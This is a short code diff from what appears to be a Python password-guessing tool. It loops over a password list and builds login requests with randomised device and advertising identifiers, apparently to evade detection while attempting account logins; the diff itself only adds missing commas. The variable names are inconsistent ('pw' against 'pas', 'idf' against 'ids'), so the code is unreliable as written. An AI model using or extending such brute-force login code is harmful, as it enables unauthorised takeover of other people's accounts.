@@ -1012,10 +1012,10 @@ def m2(idf,pwv):
       for pw in pwv:
             gtt=random.choice(xxxxx)
             data = {
-            'adid':str(uuid.uuid4())
+            'adid':str(uuid.uuid4()),
             'format':'json',
             'device':gtt,
-            'device_id':str(uuid.uuid4())
+            'device_id':str(uuid.uuid4()),
             'email':ids,
             'password':pas,
             "logged_out_id": str(uuid.uuid4()),
